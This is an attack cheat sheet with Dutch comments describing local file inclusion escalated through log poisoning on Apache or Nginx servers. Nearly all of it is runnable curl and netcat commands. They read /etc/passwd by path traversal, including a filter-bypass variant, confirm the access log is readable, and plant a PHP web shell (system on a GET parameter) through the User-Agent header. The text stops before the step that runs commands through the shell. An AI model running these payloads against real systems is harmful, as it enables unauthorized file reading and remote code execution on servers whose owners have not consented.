# LFI via Log Poisoning - Apache/Nginx access logs
# === Stap 1: LFI bevestigen ===
# Bekende log locaties:
# Apache: /var/log/apache2/access.log, /var/log/httpd/access_log
# Nginx: /var/log/nginx/access.log
# Windows: C:\xampp\apache\logs\access.log
# Test LFI:
curl "http://TARGET/page.php?file=../../../etc/passwd"
curl "http://TARGET/page.php?file=....//....//....//etc/passwd"
# === Stap 2: Log toegang verifiëren ===
curl "http://TARGET/page.php?file=../../../var/log/apache2/access.log"
# === Stap 3: PHP code injecteren via User-Agent ===
curl -A "<?php system(\$_GET['cmd']); ?>" "http://TARGET/"
# Of via netcat (meer controle):
# nc TARGET 80
# GET / HTTP/1.1
# Host: TARGET
# User-Agent: <?php system($_GET['cmd']); ?>
